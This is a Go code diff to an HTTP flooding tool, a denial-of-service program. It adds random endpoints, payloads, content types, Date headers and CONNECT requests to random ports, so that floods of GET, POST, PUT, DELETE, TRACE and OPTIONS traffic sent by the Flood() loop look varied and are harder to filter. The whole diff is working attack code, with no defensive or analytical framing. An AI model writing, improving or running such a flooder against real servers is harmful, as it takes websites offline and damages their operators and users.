@@ -2,6 +2,7 @@ package internals
 
 import (
 	"crypto/tls"
+	"math"
 	"math/rand"
 	"net"
 	"strconv"
@@ -92,11 +93,47 @@ func GenerateRandomUserAgent() string {
 		// can add more...
 	}
 
-	return userAgents[rand.Int()%len(userAgents)]
+	return userAgents[rand.Intn(len(userAgents))]
+}
+
+func GenerateRandomPayload() string {
+	alphabet := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-_"
+	payload := make([]rune, rand.Intn(1024))
+
+	for i := 0; i < len(payload); i++ {
+		payload[i] = rune(alphabet[rand.Intn(len(alphabet))])
+	}
+
+	return string(payload)
+}
+
+func GenerateRandomEndpoint() string {
+	endpoints := []string{
+		"/", // root
+		"/index.htm",
+		"/index.html",
+		"/index.php",
+		"/index.cgi",
+		"/home",
+		"/index",
+		"/contact",
+		"/support",
+		"/login",
+		"/products",
+		"/api/manage",
+		"/api/accounts",
+		"/api/users",
+		"/api/submit",
+		"/api/create_post.php",
+		"/api/create_reply.php",
+		"/" + GenerateRandomPayload(),
+	}
+
+	return endpoints[rand.Intn(len(endpoints))]
 }
 
 func GenerateRandomRequests(host string) []string {
-	methods := []string{"POST", "GET", "PUT", "HEAD", "DELETE", "OPTIONS", "TRACE"}
+	methods := []string{"POST", "GET", "PUT", "HEAD", "DELETE", "OPTIONS", "TRACE", "CONNECT"}
 
 	rand.Shuffle(len(methods), func(i, j int) {
 		methods[i], methods[j] = methods[j], methods[i]
@@ -106,19 +143,43 @@ func GenerateRandomRequests(host string) []string {
 	for _, method := range methods {
 		switch method {
 		case "GET":
-			requests = append(requests, "GET /?"+strconv.Itoa(rand.Int())+" HTTP/1.1\r\n"+"Host: "+host+"\r\nUser-Agent: "+GenerateRandomUserAgent()+"\r\n\r\n")
-		case "POST":
-			requests = append(requests, "POST / HTTP/1.1\r\nHost: "+host+"\r\nContent-Type: application/json\r\nUser-Agent: "+GenerateRandomUserAgent()+"\r\n\r\n{\"message\": \"ABCDEFGHIJKLMNOPQRSTUVWXYZ\"}\r\n\r\n")
-		case "PUT":
-			requests = append(requests, "PUT "+strconv.Itoa(rand.Int())+".html HTTP/1.1\r\nHost: "+host+"\r\nUser-Agent: "+GenerateRandomUserAgent()+"\r\n\r\n<!DOCTYPE html>\n<html>\n<p>ABCDEFGHIJKLMNOPQRSTUVWXYZ</p>\n</html>\r\n\r\n")
-		case "TRACE":
-			requests = append(requests, "TRACE / HTTP/1.1\r\nHost: "+host+"\r\nUser-Agent: "+GenerateRandomUserAgent()+"\r\n\r\n")
+			requests = append(requests, "GET "+GenerateRandomEndpoint()+"?"+strconv.Itoa(rand.Intn(10000))+" HTTP/1.1\r\nHost: "+host+"\r\nUser-Agent: "+GenerateRandomUserAgent()+"\r\n\r\n")
 		case "HEAD":
-			requests = append(requests, "HEAD /?"+strconv.Itoa(rand.Int())+" HTTP/1.1\r\n"+"Host: "+host+"\r\nUser-Agent: "+GenerateRandomUserAgent()+"\r\n\r\n")
-		case "OPTIONS":
-			requests = append(requests, "OPTIONS / HTTP/1.1\r\nHost: "+host+"\r\nUser-Agent: "+GenerateRandomUserAgent()+"\r\n\r\n")
+			requests = append(requests, "HEAD "+GenerateRandomEndpoint()+"?"+strconv.Itoa(rand.Intn(10000))+" HTTP/1.1\r\nHost: "+host+"\r\nUser-Agent: "+GenerateRandomUserAgent()+"\r\n\r\n")
+		case "POST":
+			contentTypes := []string{
+				"text/plain",
+				"application/json",
+				"application/xml",
+				"text/css",
+				"text/html; charset=UTF-8",
+				"image/png",
+				"image/jpeg",
+				"application/pdf",
+			}
+
+			requests = append(requests, "POST "+GenerateRandomEndpoint()+" HTTP/1.1\r\nHost: "+host+"\r\nUser-Agent: "+GenerateRandomUserAgent()+"\r\nDate: "+time.Now().UTC().Format(time.RFC1123)+"\r\nContent-Type: "+contentTypes[rand.Intn(len(contentTypes))]+"\r\n\r\n"+GenerateRandomPayload()+"\r\n\r\n")
+		case "PUT":
+			contentTypes := []string{
+				"text/plain",
+				"application/json",
+				"application/xml",
+				"text/css",
+				"text/html; charset=UTF-8",
+				"image/png",
+				"image/jpeg",
+				"application/pdf",
+			}
+
+			requests = append(requests, "PUT "+GenerateRandomEndpoint()+" HTTP/1.1\r\nHost: "+host+"\r\nUser-Agent: "+GenerateRandomUserAgent()+"\r\nDate: "+time.Now().UTC().Format(time.RFC1123)+"\r\nContent-Type: "+contentTypes[rand.Intn(len(contentTypes))]+"\r\n\r\n"+GenerateRandomPayload()+"\r\n\r\n")
 		case "DELETE":
-			requests = append(requests, "DELETE / HTTP/1.1\r\nHost: "+host+"\r\nUser-Agent: "+GenerateRandomUserAgent()+"\r\n\r\n") // delete self lol
+			requests = append(requests, "DELETE "+GenerateRandomEndpoint()+" HTTP/1.1\r\nHost: "+host+"\r\nUser-Agent: "+GenerateRandomUserAgent()+"\r\n\r\n")
+		case "CONNECT":
+			requests = append(requests, "CONNECT "+host+":"+strconv.Itoa(rand.Intn(math.MaxUint16))+" HTTP/1.1\r\nHost: "+host+":"+strconv.Itoa(rand.Intn(math.MaxUint16))+"\r\nUser-Agent: "+GenerateRandomUserAgent()+"\r\n\r\n")
+		case "TRACE":
+			requests = append(requests, "TRACE "+GenerateRandomEndpoint()+" HTTP/1.1\r\nHost: "+host+"\r\nUser-Agent: "+GenerateRandomUserAgent()+"\r\n\r\n")
+		case "OPTIONS":
+			requests = append(requests, "OPTIONS "+GenerateRandomEndpoint()+" HTTP/1.1\r\nHost: "+host+"\r\nUser-Agent: "+GenerateRandomUserAgent()+"\r\n\r\n")
 		}
 	}
 
@@ -174,7 +235,7 @@ func (flooder *HttpFlooder) Flood() {
 		for _, request := range requests {
 			n, err := conn.Write([]byte(request))
 			if err != nil {
-				print_sumthin("failed to send request!", ERROR);
+				print_sumthin("failed to send request!", ERROR)
 				continue
 			}
 			print_sumthin("Sent: "+strconv.Itoa(n), INFO)
@@ -185,4 +246,3 @@ func (flooder *HttpFlooder) Flood() {
 		}
 	}
 }
-
